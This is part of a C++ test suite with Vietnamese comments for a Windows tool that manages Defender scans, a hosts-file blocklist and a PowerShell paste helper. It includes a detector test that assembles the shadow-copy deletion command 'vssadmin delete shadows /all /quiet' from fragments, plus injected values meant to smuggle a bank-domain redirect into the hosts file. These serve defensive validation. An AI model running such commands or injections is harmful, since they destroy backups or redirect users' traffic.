        const auto noPath = DefenderController::internal::parseThreatsJson(
            R"({"ThreatID":1,"ThreatName":"X","SeverityID":5,"Resources":["", "  "],"IsActive":true})", nullptr);
        CHECK(noPath.size() == 1 && noPath.first().resources.isEmpty());
        const auto somePath = DefenderController::internal::parseThreatsJson(
            R"({"ThreatID":1,"ThreatName":"X","SeverityID":5,"Resources":["","file:_C:\\a.exe"],"IsActive":true})", nullptr);
        CHECK(somePath.size() == 1 && somePath.first().resources == QStringList({"file:_C:\\a.exe"}));
        // ThreatID vượt quá int32 (ID thật của Defender, vd 2147519003 = EICAR) không bị cắt
        const auto bigId = DefenderController::internal::parseThreatsJson(
            R"([{"ThreatID":2147519003,"ThreatName":"Y","SeverityID":1,"Resources":[],"IsActive":false}])", nullptr);
        CHECK(bigId.size() == 1 && bigId.first().threatId == 2147519003LL);
    }

    // ---- DefenderController::toggleOutcome: kết luận sau khi bật/tắt (hồi quy "✓ Đã tắt" giả khi đọc lại lỗi) ----
    {
        using DefenderController::ToggleOutcome;
        using DefenderController::toggleOutcome;
        CHECK(toggleOutcome("", true, true) == ToggleOutcome::Applied);
        CHECK(toggleOutcome("", false, false) == ToggleOutcome::Applied);
        CHECK(toggleOutcome("", true, false) == ToggleOutcome::NotApplied);
        CHECK(toggleOutcome("", false, true) == ToggleOutcome::NotApplied);
        // Đọc lại lỗi: trạng thái mặc định (false) TRÙNG với yêu cầu "tắt" - trước đây báo "✓ Đã tắt"
        CHECK(toggleOutcome("Hết thời gian chờ", false, false) == ToggleOutcome::Unknown);
        CHECK(toggleOutcome("Hết thời gian chờ", false, true) == ToggleOutcome::Unknown);
        CHECK(toggleOutcome("x", true, true) == ToggleOutcome::Unknown);
    }

    // ---- HostsBlocklist: phân tích/dựng lại nội dung hosts file - THUẦN CHUỖI, không đụng tệp thật ----
    {
        const QString sample = QString(
            "127.0.0.1 localhost\n"
            "# vài dòng khác của người dùng - PHẢI được giữ nguyên\n"
            "192.168.1.1 router.local\n\n"
            "%1\n"
            "0.0.0.0 doc-hai-1.com\n"
            "0.0.0.0 doc-hai-2.com\n"
            "%2\n")
                                 .arg(HostsBlocklist::internal::kMarkerStart, HostsBlocklist::internal::kMarkerEnd);

        const auto domains = HostsBlocklist::internal::parseManagedDomains(sample);
        CHECK(domains.size() == 2);
        CHECK(domains.contains("doc-hai-1.com"));
        CHECK(domains.contains("doc-hai-2.com"));

        // Dựng lại với danh sách MỚI - các dòng khác của người dùng phải được giữ nguyên, khối cũ bị thay
        const QString updated = HostsBlocklist::internal::buildUpdatedHostsContent(sample, {"doc-hai-3.com"});
        CHECK(updated.contains("127.0.0.1 localhost"));
        CHECK(updated.contains("192.168.1.1 router.local"));
        CHECK(updated.contains("vài dòng khác của người dùng"));
        CHECK(!updated.contains("doc-hai-1.com"));
        CHECK(!updated.contains("doc-hai-2.com"));
        CHECK(updated.contains("0.0.0.0 doc-hai-3.com"));

        // Vòng lặp lại: phân tích nội dung vừa dựng phải cho đúng danh sách mới
        const auto reparsed = HostsBlocklist::internal::parseManagedDomains(updated);
        CHECK(reparsed.size() == 1);
        CHECK(reparsed.contains("doc-hai-3.com"));

        // Danh sách rỗng -> không còn khối nào trong nội dung mới (xóa sạch, không để lại marker trống)
        const QString cleared = HostsBlocklist::internal::buildUpdatedHostsContent(sample, {});
        CHECK(!cleared.contains(HostsBlocklist::internal::kMarkerStart));
        CHECK(cleared.contains("127.0.0.1 localhost")); // vẫn giữ nguyên nội dung khác

        // Nội dung hosts trống từ đầu (máy mới) vẫn dựng được khối hợp lệ, không crash
        const QString fromEmpty = HostsBlocklist::internal::buildUpdatedHostsContent("", {"moi.com"});
        CHECK(fromEmpty.contains("0.0.0.0 moi.com"));
    }

    // ---- DefenderScanWorker: hồi quy lỗi THẬT - cờ hủy của lần quét trước không được dính sang lần sau
    // (worker được tái dùng; trước đây hủy một lần là mọi lần quét sau đều tự dừng sau ~200ms). KHÔNG
    // start() ở đây - chạy thật sẽ gọi Start-MpScan thật. ----
    {
        DefenderScanWorker worker;
        CHECK(!worker.isCancelRequested());
        worker.requestCancel();
        CHECK(worker.isCancelRequested());
        worker.setScan(DefenderController::ScanType::Quick);
        CHECK(!worker.isCancelRequested());
    }

    // ---- HostsBlocklist::normalizeDomain ----
    {
        using HostsBlocklist::internal::normalizeDomain;
        CHECK(normalizeDomain("Vi-Du.COM") == "vi-du.com");
        CHECK(normalizeDomain("  https://Evil.Example.com:8443/duong/dan?x=1#y  ") == "evil.example.com");
        CHECK(normalizeDomain("http://user:pass@evil.example/") == "evil.example");
        CHECK(normalizeDomain("evil.example.") == "evil.example");
        CHECK(normalizeDomain("intranet") == "intranet");
        CHECK(normalizeDomain(QString::fromUtf8("b\u00fccher.example")) == "xn--bcher-kva.example"); // IDN -> punycode

        for (const char* bad : {"", "   ", "a.com b.com", "a.com\tb.com", "a.com\n1.2.3.4 bank.example", "1.2.3.4",
                                "http://192.168.1.1/admin", "localhost", "a..com", "-a.com", "a-.com", "*.a.com",
                                "a.com,b.com", "a.com#ghi-chu x", "[::1]", "a_b!.com", "https://"})
        {
            QString err;
            CHECK(normalizeDomain(bad, &err).isEmpty());
            CHECK(!err.isEmpty());
        }
    }

    // ---- HostsBlocklist: khối HỎNG (thiếu marker END) không được nuốt phần còn lại của hosts file ----
    {
        using namespace HostsBlocklist::internal;
        const QString broken = QString(
            "127.0.0.1 localhost\n"
            "%1\n"
            "0.0.0.0 doc-hai-1.com\n"
            "0.0.0.0 doc-hai-2.com\n"
            "10.0.0.5 may-chu-noi-bo.local\n"
            "# ghi chu cua nguoi dung\n"
            "0.0.0.0 quang-cao-nguoi-dung-tu-chan.com\n")
                                   .arg(kMarkerStart);

        // Chỉ các dòng LIỀN NGAY sau START đúng dạng của công cụ mới tính là của công cụ
        const auto domains = parseManagedDomains(broken);
        CHECK(domains == QStringList({"doc-hai-1.com", "doc-hai-2.com"}));

        const QString rebuilt = buildUpdatedHostsContent(broken, {"doc-hai-1.com"});
        CHECK(rebuilt.contains("127.0.0.1 localhost"));
        CHECK(rebuilt.contains("10.0.0.5 may-chu-noi-bo.local"));               // TRƯỚC ĐÂY bị xóa mất
        CHECK(rebuilt.contains("# ghi chu cua nguoi dung"));                     // TRƯỚC ĐÂY bị xóa mất
        CHECK(rebuilt.contains("0.0.0.0 quang-cao-nguoi-dung-tu-chan.com"));     // TRƯỚC ĐÂY bị xóa mất
        CHECK(!rebuilt.contains("doc-hai-2.com"));
        CHECK(rebuilt.count(kMarkerStart) == 1 && rebuilt.count(kMarkerEnd) == 1); // khối được dựng lại lành lặn
        CHECK(parseManagedDomains(rebuilt) == QStringList({"doc-hai-1.com"}));
        // Dòng tự chặn của người dùng nằm NGOÀI khối mới - không bị công cụ nhận vơ
        CHECK(rebuilt.indexOf("quang-cao-nguoi-dung-tu-chan.com") < rebuilt.indexOf(kMarkerStart));

        // Khối lành lặn nhưng có dòng lạ người dùng tự thêm vào giữa - giữ lại, không xóa, không nhận vơ
        const QString handEdited = QString("%1\n0.0.0.0 a.com b.com\n127.0.0.1 dev.local\n# chu thich\n%2\n")
                                       .arg(kMarkerStart, kMarkerEnd);
        CHECK(parseManagedDomains(handEdited) == QStringList({"a.com", "b.com"})); // cả hai tên trên một dòng
        const QString rebuilt2 = buildUpdatedHostsContent(handEdited, parseManagedDomains(handEdited));
        CHECK(rebuilt2.contains("127.0.0.1 dev.local"));
        CHECK(rebuilt2.contains("# chu thich"));
        CHECK(rebuilt2.contains("0.0.0.0 a.com\n0.0.0.0 b.com\n")); // mỗi tên miền một dòng
        CHECK(!parseManagedDomains(rebuilt2).contains("dev.local"));

        // Mục hỏng trong danh sách truyền vào không được chèn thêm dòng/tên khác vào hosts file
        const QString guarded = buildUpdatedHostsContent("", {"ok.com", "x.com\n1.2.3.4 bank.example", "a.com b.com", " ", "OK.com"});
        CHECK(guarded == kMarkerStart + "\n0.0.0.0 ok.com\n" + kMarkerEnd + "\n");
    }

    // ---- HostsBlocklist: đọc/ghi THẬT trên một tệp TẠM (không bao giờ là hosts file thật của máy) ----
    {
        using namespace HostsBlocklist::internal;
        QTemporaryDir tmp;
        CHECK(tmp.isValid());
        const QString path = tmp.path() + "/hosts";

        auto readBytes = [](const QString& p) {
            QFile f(p);
            return f.open(QIODevice::ReadOnly) ? f.readAll() : QByteArray();
        };
        auto writeBytes = [](const QString& p, const QByteArray& data) {
            QFile f(p);
            return f.open(QIODevice::WriteOnly | QIODevice::Truncate) && f.write(data) == data.size();
        };

        // Nội dung gốc: CRLF + một dòng ghi chú KHÔNG phải UTF-8 hợp lệ (codepage ANSI, byte 0xE9) - phải
        // được giữ nguyên TỪNG BYTE qua mọi lần ghi.
        const QByteArray original = QByteArray("127.0.0.1 localhost\r\n# caf") + char(0xE9) + QByteArray(" cu\r\n10.0.0.5 nas.local\r\n");
        CHECK(writeBytes(path, original));

        QString err;
        CHECK(listBlockedDomainsInFile(path, &err).isEmpty());
        CHECK(err.isEmpty());

        // Nội dung không phải tên miền bị từ chối và KHÔNG đụng vào tệp (cũng chưa tạo bản sao lưu)
        CHECK(!addDomainToFile(path, "a.com b.com", &err));
        CHECK(!err.isEmpty());
        CHECK(readBytes(path) == original);
        CHECK(!QFile::exists(backupFilePath(path)));

        err.clear();
        CHECK(addDomainToFile(path, "https://Doc-Hai.Example/trang", &err));
        CHECK(err.isEmpty());
        // Sao lưu MỘT lần, đúng nguyên bản trước khi công cụ đụng vào
        CHECK(QFile::exists(backupFilePath(path)));
        CHECK(readBytes(backupFilePath(path)) == original);

        const QByteArray afterAdd = readBytes(path);
        CHECK(afterAdd.startsWith(original));                          // phần của người dùng giữ nguyên từng byte
        CHECK(afterAdd.contains("0.0.0.0 doc-hai.example\r\n"));      // đã chuẩn hóa, kết thúc dòng CRLF
        CHECK(!afterAdd.contains("\r\r"));
        CHECK(!afterAdd.contains("\xEF\xBF\xBD"));                     // không sinh ký tự thay thế U+FFFD
        CHECK(listBlockedDomainsInFile(path) == QStringList({"doc-hai.example"}));

        // Thêm lại đúng tên đó: không đổi gì; thêm tên khác: bản sao lưu KHÔNG bị ghi đè
        CHECK(addDomainToFile(path, "DOC-HAI.example", &err));
        CHECK(readBytes(path) == afterAdd);
        CHECK(addDomainToFile(path, "thu-hai.example", &err));
        CHECK(listBlockedDomainsInFile(path) == QStringList({"doc-hai.example", "thu-hai.example"}));
        CHECK(readBytes(backupFilePath(path)) == original);

        // Gỡ hết: khối biến mất, phần của người dùng vẫn nguyên vẹn
        CHECK(removeDomainFromFile(path, "doc-hai.example", &err));
        CHECK(removeDomainFromFile(path, "thu-hai.example", &err));
        CHECK(listBlockedDomainsInFile(path).isEmpty());
        const QByteArray afterRemove = readBytes(path);
        CHECK(afterRemove.startsWith(original));
        CHECK(!afterRemove.contains("OneForAll"));
        // Gỡ tên không có trong danh sách: thành công, không ghi gì
        CHECK(removeDomainFromFile(path, "khong-co.example", &err));
        CHECK(readBytes(path) == afterRemove);

        // Tệp UTF-8 có BOM + dấu tiếng Việt: giữ nguyên BOM và nội dung
        const QString path2 = tmp.path() + "/hosts-utf8";
        const QByteArray utf8Original = QByteArray("\xEF\xBB\xBF# m\xC3\xA1y ch\xE1\xBB\xA7 n\xE1\xBB\x99i b\xE1\xBB\x99\r\n10.0.0.9 nas\r\n");
        CHECK(writeBytes(path2, utf8Original));
        CHECK(addDomainToFile(path2, "x.example", &err));
        CHECK(readBytes(path2).startsWith(utf8Original));

        // Chưa có hosts file: tạo mới chỉ gồm khối của công cụ, không có gì để sao lưu
        const QString path3 = tmp.path() + "/hosts-moi";
        CHECK(listBlockedDomainsInFile(path3, &err).isEmpty());
        CHECK(addDomainToFile(path3, "moi.example", &err));
        CHECK(listBlockedDomainsInFile(path3) == QStringList({"moi.example"}));
        CHECK(!QFile::exists(backupFilePath(path3)));

        // Mục cũ không hợp lệ do bản trước ghi vào vẫn hiện ra và gỡ được
        const QString path4 = tmp.path() + "/hosts-cu";
        CHECK(writeBytes(path4, (kMarkerStart + "\r\n0.0.0.0 http://cu.example/a\r\n" + kMarkerEnd + "\r\n").toUtf8()));
        CHECK(listBlockedDomainsInFile(path4) == QStringList({"http://cu.example/a"}));
        CHECK(removeDomainFromFile(path4, "http://cu.example/a", &err));
        CHECK(listBlockedDomainsInFile(path4).isEmpty());
    }

    // ---- CommandLauncherInternal: chuẩn bị văn bản dán + cảnh báo trước khi dán (KHÔNG mở PowerShell) ----
    {
        using namespace CommandLauncherInternal;
        // Ký tự xuống dòng ở cuối = console tự bấm Enter hộ khi dán -> phải bị bỏ
        CHECK(prepareForPaste("Get-Process\r\n") == "Get-Process");
        CHECK(prepareForPaste("\n\n  Get-Process  \n\n") == "  Get-Process");
        CHECK(prepareForPaste("a\r\nb\rc") == "a\nb\nc");
        CHECK(prepareForPaste(QString("a") + QChar(0x2029) + "b") == "a\nb");
        CHECK(prepareForPaste(" \r\n\t ").isEmpty());
        CHECK(lineCount("") == 0);
        CHECK(lineCount("a") == 1);
        CHECK(lineCount(prepareForPaste("a\nb\n\nc\n")) == 4);

        CHECK(prepareForPaste("") == "");
        CHECK(prepareForPaste("Get-Date") == "Get-Date");
        CHECK(prepareForPaste("\tGet-Date") == "\tGet-Date");            // thụt lề dòng đầu được giữ
        CHECK(prepareForPaste("a\n\n\nb") == "a\n\n\nb");                // dòng trắng GIỮA lệnh được giữ
        CHECK(prepareForPaste("a\r\n\r\n") == "a");
        CHECK(prepareForPaste(QString("a") + QChar(0x2028) + "b\r\n") == "a\nb");
        CHECK(prepareForPaste("a  \t\r\n  ") == "a");                    // khoảng trắng/tab cuối bị bỏ
        CHECK(prepareForPaste(QString("a") + QChar(0x00A0)) == "a");      // NBSP cuối cũng là khoảng trắng
        CHECK(lineCount("a\nb") == 2);

        // Từ v1.28.1 lệnh nhiều dòng KHÔNG còn bị hỏi lại (dán qua PSReadLine không chạy dòng nào - đo thật);
        // chỉ còn cảnh báo khi ứng dụng đang có quyền Administrator.
        CHECK(pasteWarnings("Get-Process", false).isEmpty());
        CHECK(pasteWarnings("Get-Process", true).size() == 1);
        CHECK(pasteWarnings("Get-Process", true).first().contains("Administrator"));
        CHECK(pasteWarnings("a\nb", false).isEmpty());
        CHECK(pasteWarnings("a\nb\nc", true).size() == 1);

        // Hướng dẫn tự dán: luôn có Ctrl+V; lệnh nhiều dòng thì cảnh báo thêm về dán bằng chuột phải.
        CHECK(manualPasteHint(1).contains("Ctrl+V"));
        CHECK(!manualPasteHint(1).contains(QString::fromUtf8("chuột phải")));
        CHECK(manualPasteHint(3).contains(QString::fromUtf8("chuột phải")));

        // Diễn giải mã thoát của tiến trình phụ "--console-paste"
        using O = ConsolePaste::Outcome;
        auto res = [](O o, int lines = 1) { return helperResult(static_cast<int>(o), false, lines, 20); };
        CHECK(res(O::Pasted).ok);
        CHECK(res(O::Pasted).message.contains(QString::fromUtf8("CHƯA chạy")));
        CHECK(!res(O::Pasted).message.contains("Tab"));
        CHECK(helperResult(0, false, 1, 20, /*hasTabs=*/true).message.contains("Tab")); // Paste của PSReadLine đổi Tab
        CHECK(res(O::SentUnverified).ok);
        CHECK(!res(O::AttachFailed).ok);
        CHECK(res(O::AttachFailed).message.contains("Ctrl+V"));
        CHECK(!res(O::NotSeen).ok);
        CHECK(res(O::NotSeen).message.contains("20 giây"));
        CHECK(!res(O::PromptIdle).ok);
        CHECK(res(O::PromptIdle).message.contains("PSReadLine"));
        CHECK(res(O::PromptIdle, 2).message.contains(QString::fromUtf8("chuột phải")));
        CHECK(!res(O::ProcessExited).ok);
        CHECK(!res(O::BadArguments).ok);
        CHECK(res(O::BadArguments).message.contains("6"));
        CHECK(!res(O::WriteFailed).ok);
        CHECK(!helperResult(99, false, 1, 20).ok);                       // mã lạ
        CHECK(helperResult(99, false, 1, 20).message.contains("99"));
        CHECK(!helperResult(-1, false, 1, 20).ok);
        CHECK(!helperResult(0, true, 1, 20).ok);                         // tiến trình phụ bị kết thúc
        CHECK(helperResult(0, true, 1, 20).message.contains(QString::fromUtf8("đóng")));
        CHECK(!helperResult(static_cast<int>(0xC000013Au), false, 1, 20).ok); // STATUS_CONTROL_C_EXIT
        for (int code = -2; code <= 10; ++code)                         // không mã nào ra thông báo rỗng
            CHECK(!helperResult(code, false, 2, 20).message.trimmed().isEmpty());

        // Dòng lệnh CreateProcessW: tách lại bằng đúng quy tắc của Windows (CommandLineToArgvW) phải ra y nguyên
        const QString exe = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        CHECK(buildCommandLine(exe, {}) == "\"" + exe + "\"");
        const QList<QStringList> argSets = {
            {"-NoProfile"},
            {"-NoProfile", "-NoExit", "-Command", "Remove-Module PSReadLine"},
            {""},
            {"a b", "c\"d", "e\\f", "g\\\"h", "trailing\\", "two words\\", "\\\\server\\share x"},
            {"tab\there", "  ", "\"", "\\"},
        };
        for (const QStringList& args : argSets)
        {
            const QString line = buildCommandLine(exe, args);
            int n = 0;
            LPWSTR* parsed = CommandLineToArgvW(reinterpret_cast<LPCWSTR>(line.utf16()), &n);
            QStringList back;
            for (int i = 0; parsed && i < n; ++i)
                back << QString::fromWCharArray(parsed[i]);
            LocalFree(parsed);
            CHECK(back.size() == args.size() + 1);
            CHECK(!back.isEmpty() && back.first() == exe);
            CHECK(back.mid(1) == args);
        }
    }

    // ---- ConsolePaste::internal: nhận ra lệnh trên màn hình console (không mở console nào) ----
    {
        using namespace ConsolePaste::internal;
        CHECK(asciiLettersAndDigits("Get-Process -Id 42 | Stop-Process") == "GetProcessId42StopProcess");
        // Chữ có dấu bị bỏ: PSReadLine 2.0 có thể VẼ chúng thành "?" (nội dung bên trong vẫn đúng) - lệnh gốc và
        // màn hình phải ra cùng một chuỗi dù chữ có dấu hiện đúng hay hiện thành "?".
        CHECK(asciiLettersAndDigits(QString::fromUtf8("Tiếng Việt: đã dán!")) == "TingVitdn");
        CHECK(asciiLettersAndDigits("Ti?ng Vi?t: ?? d?n!") == "TingVitdn");
        CHECK(verificationKey(QString::fromUtf8("Write-Output 'Tiếng Việt có dấu'")) ==
              verificationKey("Write-Output 'Ti?ng Vi?t c? d?u'"));
        CHECK(asciiLettersAndDigits(QString::fromUtf8("漢字 😀 ０１２")).isEmpty()); // chữ số toàn khổ không phải ASCII
        CHECK(asciiLettersAndDigits("$_ | % {$_}").isEmpty());
        CHECK(asciiLettersAndDigits("").isEmpty());
        CHECK(verificationKey(QString::fromUtf8("漢字\nGet-Date")).isEmpty()); // dòng đầu không có chữ/số ASCII

        CHECK(verificationKey("Get-Date") == "GetDate");
        CHECK(verificationKey("\n\n  \nGet-Date\nSet-Content") == "GetDate");   // dòng KHÔNG trống đầu tiên
        CHECK(verificationKey(QString(100, 'a')) == QString(40, 'a'));          // tối đa 40 ký tự
        CHECK(verificationKey("abc", 2) == "ab");
        CHECK(verificationKey("abc", 0).isEmpty());
        CHECK(verificationKey("$_ | % {$_}\nGet-Date").isEmpty());             // dòng đầu chỉ có ký hiệu
        CHECK(verificationKey("").isEmpty());
        CHECK(verificationKey("   \n\t").isEmpty());

        // Lệnh tự gãy dòng trên console + dấu nhắc nối dòng ">> " của PSReadLine vẫn khớp
        const QString screen = "PS C:\\Users\\HP> Set-Content -LiteralPath 'C:\\Te"
                               "mp\\marker.txt' -Value ran                     "
                               ">> Get-Date";
        CHECK(countOccurrences(asciiLettersAndDigits(screen), verificationKey("Set-Content -LiteralPath 'C:\\Temp\\marker.txt' -Value ran")) == 1);
        CHECK(countOccurrences("aaaa", "aa") == 2);                             // không chồng lấn
        CHECK(countOccurrences("abcabc", "abc") == 2);
        CHECK(countOccurrences("abc", "") == 0);
        CHECK(countOccurrences("", "a") == 0);
        CHECK(countOccurrences("ab", "abc") == 0);

        CHECK(looksLikeIdlePrompt("PS C:\\>"));
        CHECK(looksLikeIdlePrompt("PS C:\\Users\\HP> "));
        CHECK(looksLikeIdlePrompt(">> "));
        CHECK(!looksLikeIdlePrompt(""));
        CHECK(!looksLikeIdlePrompt("   "));
        CHECK(!looksLikeIdlePrompt("PS C:\\> Get-Da"));                          // đang có chữ sau dấu nhắc
        CHECK(!looksLikeIdlePrompt("Loading personal and system profiles took 812ms."));
    }

    // ---- Hồi quy các lỗi tìm thấy khi stress test (xem tests/secdl_stress_tests.cpp) ----
    {
        using RL = CommandAnalyzer::RiskLevel;
        const QString needle = S({"vss", "admin del", "ete sha", "dows /all /quiet"});
        // Một nửa cặp thay thế mồ côi (UTF-16 không hợp lệ) từng làm MỌI mẫu trả "không khớp" -> báo An toàn.
        CHECK(CommandAnalyzer::analyze(QString(QChar(0xD83D)) + "\n" + needle).level == RL::Dangerous);
        CHECK(CommandAnalyzer::analyze(needle + " " + QString(QChar(0xDC00))).level == RL::Dangerous);
        // Phần đầu của một mẫu lặp lại hàng chục nghìn lần trên một dòng từng mất nhiều giây (thời gian bậc
        // hai) - nay tuyến tính, và dòng nguy hiểm đứng sau vẫn bị bắt.
        const QString flood = S({"cu", "rl "}).repeated(60000) + "\n" + needle;
        QElapsedTimer timer;
        timer.start();
        CHECK(CommandAnalyzer::analyze(flood).level == RL::Dangerous);
        CHECK(timer.elapsed() < 2000);
        // Hàng trăm nghìn cụm [char] liền nhau vẫn bị bắt (không làm cạn ngăn xếp của bộ máy regex).
        CHECK(CommandAnalyzer::analyze(QString("[char]65+").repeated(200000)).level == RL::Dangerous);
    }
    {
        // Hosts file xuống dòng thuần '\n': giữ nguyên từng byte phần của người dùng, khối mới cũng dùng '\n'.
        using namespace HostsBlocklist::internal;
        QTemporaryDir tmp;
        CHECK(tmp.isValid());
        const QString path = tmp.path() + "/hosts-lf";
        const QByteArray original = "127.0.0.1 localhost\n# ghi chu\n10.0.0.5 nas.local\n";
        {
            QFile out(path);
            CHECK(out.open(QIODevice::WriteOnly) && out.write(original) == original.size());
        }
        // Gỡ một tên KHÔNG có trên tệp chưa từng có khối của công cụ: không ghi gì, không tạo bản sao lưu.
        CHECK(removeDomainFromFile(path, "khong-co.example"));
        CHECK(!QFile::exists(backupFilePath(path)));
        CHECK(addDomainToFile(path, "lf.example"));
        QFile in(path);
        CHECK(in.open(QIODevice::ReadOnly));
        const QByteArray after = in.readAll();
        CHECK(after.startsWith(original) && !after.contains('\r'));
        CHECK(listBlockedDomainsInFile(path) == QStringList({"lf.example"}));
    }
    {
        // Hồi quy: hosts LẪN LỘN "\r\n" và "\n" từng bị đưa cả về "\r\n" - tức sửa những dòng không phải của
        // công cụ. Nay từng dòng của người dùng giữ đúng kiểu của nó; chỉ dòng công cụ ghi theo kiểu đa số.
        using namespace HostsBlocklist::internal;
        QTemporaryDir tmp;
        CHECK(tmp.isValid());
        auto readBytes = [](const QString& p) {
            QFile f(p);
            return f.open(QIODevice::ReadOnly) ? f.readAll() : QByteArray();
        };
        auto writeBytes = [](const QString& p, const QByteArray& data) {
            QFile f(p);
            return f.open(QIODevice::WriteOnly | QIODevice::Truncate) && f.write(data) == data.size();
        };

        // Đa số "\r\n" (3 dòng) so với "\n" (2 dòng)
        const QString mixed = tmp.path() + "/hosts-lan-lon";
        const QByteArray original = "127.0.0.1 localhost\r\n# dong kieu unix\n10.0.0.5 nas.local\r\n10.0.0.6 in.local\n# cuoi\r\n";
        CHECK(writeBytes(mixed, original));
        CHECK(addDomainToFile(mixed, "lan-lon.example"));
        const QByteArray afterAdd = readBytes(mixed);
        CHECK(afterAdd.startsWith(original)); // từng byte của người dùng còn nguyên, kể cả 2 dòng "\n"
        CHECK(afterAdd.contains("0.0.0.0 lan-lon.example\r\n"));
        CHECK(afterAdd.endsWith((kMarkerEnd + "\r\n").toUtf8()));
        CHECK(!afterAdd.contains("\r\r"));
        CHECK(readBytes(backupFilePath(mixed)) == original);
        CHECK(addDomainToFile(mixed, "thu-hai.example"));
        CHECK(readBytes(mixed).startsWith(original));
        CHECK(listBlockedDomainsInFile(mixed) == QStringList({"lan-lon.example", "thu-hai.example"}));
        CHECK(removeDomainFromFile(mixed, "lan-lon.example") && removeDomainFromFile(mixed, "thu-hai.example"));
        CHECK(readBytes(mixed).startsWith(original));
        CHECK(!readBytes(mixed).contains("OneForAll"));

        // Đa số "\n": dòng công cụ ghi dùng "\n", dòng "\r\n" duy nhất của người dùng vẫn là "\r\n"
        const QString mostlyLf = tmp.path() + "/hosts-da-so-lf";
        const QByteArray lfOriginal = "127.0.0.1 localhost\n10.0.0.5 nas.local\r\n# ghi chu\n";
        CHECK(writeBytes(mostlyLf, lfOriginal));
        CHECK(addDomainToFile(mostlyLf, "x.example"));
        const QByteArray lfAfter = readBytes(mostlyLf);
        CHECK(lfAfter.startsWith(lfOriginal));
        CHECK(lfAfter.contains("0.0.0.0 x.example\n") && !lfAfter.contains("0.0.0.0 x.example\r\n"));
        CHECK(lfAfter.count("\r\n") == 1);

        // Dòng cuối tệp KHÔNG có xuống dòng: phần xuống dòng thêm vào là của công cụ -> theo kiểu đa số
        const QString noEol = tmp.path() + "/hosts-khong-xuong-dong-cuoi";
        const QByteArray noEolOriginal = "127.0.0.1 localhost\r\n10.0.0.5 nas.local";
        CHECK(writeBytes(noEol, noEolOriginal));
        CHECK(addDomainToFile(noEol, "y.example"));
        CHECK(readBytes(noEol).startsWith(noEolOriginal + "\r\n\r\n" + kMarkerStart.toUtf8() + "\r\n"));

        // Thuần chuỗi: tham số eol chỉ áp cho dòng của công cụ; mặc định ("\n") như trước
        CHECK(buildUpdatedHostsContent("a\r\nb\nc", {"x.com"}, "\r\n") ==
              "a\r\nb\nc\r\n\r\n" + kMarkerStart + "\r\n0.0.0.0 x.com\r\n" + kMarkerEnd + "\r\n");
        CHECK(buildUpdatedHostsContent("a\r\nb\n", {"x.com"}, "\r\n") ==
              "a\r\nb\n\r\n" + kMarkerStart + "\r\n0.0.0.0 x.com\r\n" + kMarkerEnd + "\r\n");
        CHECK(buildUpdatedHostsContent("a\nb", {"x.com"}) == "a\nb\n\n" + kMarkerStart + "\n0.0.0.0 x.com\n" + kMarkerEnd + "\n");

        // Hồi quy: hosts CHƯA tồn tại ở lần ghi đầu -> lần ghi thứ hai từng tạo bản .bak chứa chính khối của
        // công cụ. Bản sao lưu chỉ được là nội dung có TRƯỚC khi công cụ đụng tới.
        const QString fresh = tmp.path() + "/hosts-chua-co";
        CHECK(addDomainToFile(fresh, "mot.example"));
        CHECK(!QFile::exists(backupFilePath(fresh)));
        CHECK(addDomainToFile(fresh, "hai.example"));
        CHECK(!QFile::exists(backupFilePath(fresh)));
        CHECK(removeDomainFromFile(fresh, "mot.example") && removeDomainFromFile(fresh, "hai.example"));
        CHECK(addDomainToFile(fresh, "ba.example")); // tệp lúc này rỗng - vẫn không có gì đáng sao lưu
        CHECK(!QFile::exists(backupFilePath(fresh)));
        CHECK(listBlockedDomainsInFile(fresh) == QStringList({"ba.example"}));
    }

    std::printf("passed=%d failed=%d\n", g_pass, g_fail);
    std::printf("\nLUU Y: khong co Windows Defender/hosts file THAT trong test nay - cac ham goi\n");
    std::printf("PowerShell/doc-ghi he thong that (getStatus/startScan/listThreats/removeAllActiveThreats/\n");
    std::printf("addDomain/removeDomain) can duoc tu kiem tra tay tren may that. Luong mo PowerShell + dan lenh\n");
    std::printf("(CommandLauncher/ConsolePaste) duoc kiem dau-cuoi o command_launcher_tests.\n");
    return g_fail == 0 ? 0 : 1;
}
